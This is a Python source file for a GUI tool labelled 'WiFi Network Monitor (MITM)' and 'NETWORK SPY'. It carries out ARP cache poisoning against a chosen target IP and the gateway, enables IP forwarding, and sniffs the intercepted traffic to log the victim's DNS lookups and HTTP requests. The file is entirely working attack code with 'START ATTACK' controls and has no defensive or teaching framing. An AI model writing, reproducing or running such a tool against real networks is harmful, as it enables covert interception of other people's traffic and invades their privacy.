import customtkinter as ctk
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
import threading
import os

class WiFiSpyGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("⚡ WiFi Network Monitor (MITM)")
        self.geometry("1000x700")
        ctk.set_appearance_mode("Dark")

        # --- Sidebar ---
        self.sidebar = ctk.CTkFrame(self, width=250)
        self.sidebar.pack(side="left", fill="y", padx=10, pady=10)

        ctk.CTkLabel(self.sidebar, text="NETWORK SPY", font=("Arial", 20, "bold")).pack(pady=20)
        
        self.target_ip = ctk.CTkEntry(self.sidebar, placeholder_text="Target IP (e.g. 192.168.1.5)")
        self.target_ip.pack(pady=10, padx=10)
        
        self.gateway_ip = ctk.CTkEntry(self.sidebar, placeholder_text="Gateway (Router) IP")
        self.gateway_ip.pack(pady=10, padx=10)

        self.start_btn = ctk.CTkButton(self.sidebar, text="▶ START ATTACK", fg_color="green", command=self.start_attack)
        self.start_btn.pack(pady=10, padx=10)

        self.stop_btn = ctk.CTkButton(self.sidebar, text="⏹ STOP ALL", fg_color="red", command=self.stop_attack)
        self.stop_btn.pack(pady=10, padx=10)

        # --- Monitor View ---
        self.log_box = ctk.CTkTextbox(self, font=("Consolas", 13), text_color="#00FF00")
        self.log_box.pack(expand=True, fill="both", padx=20, pady=20)

        self.is_running = False

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans: return ans[0][1].hwsrc
        return None

    def spoof(self, target_ip, host_ip):
        target_mac = self.get_mac(target_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
        send(packet, verbose=False)

    def restore(self, target_ip, host_ip):
        target_mac = self.get_mac(target_ip)
        host_mac = self.get_mac(host_ip)
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        send(packet, count=4, verbose=False)

    def packet_callback(self, pkt):
        if pkt.haslayer(DNSQR):
            domain = pkt[DNSQR].qname.decode()
            self.log(f"[VISIT] User {pkt[IP].src} ➔ {domain}")
        elif pkt.haslayer(Raw):
            data = pkt[Raw].load.decode(errors='ignore')
            if "GET" in data or "POST" in data:
                self.log(f"[ACTIVITY] {pkt[IP].src} is browsing web data...")

    def log(self, msg):
        self.log_box.insert("end", f"{msg}\n")
        self.log_box.see("end")

    def attack_thread(self):
        t_ip = self.target_ip.get()
        g_ip = self.gateway_ip.get()
        
        # IP Forwarding enable karna (Linux)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        self.log(f"[*] Attacking {t_ip}... Poisoning ARP Cache.")
        try:
            while self.is_running:
                self.spoof(t_ip, g_ip)
                self.spoof(g_ip, t_ip)
                time.sleep(2)
        except: self.stop_attack()

    def start_attack(self):
        self.is_running = True
        threading.Thread(target=self.attack_thread, daemon=True).start()
        threading.Thread(target=lambda: sniff(prn=self.packet_callback, store=0, stop_filter=lambda x: not self.is_running), daemon=True).start()

    def stop_attack(self):
        self.is_running = False
        self.log("[!] Stopping attack and restoring network...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
    app = WiFiSpyGUI()
    app.mainloop()
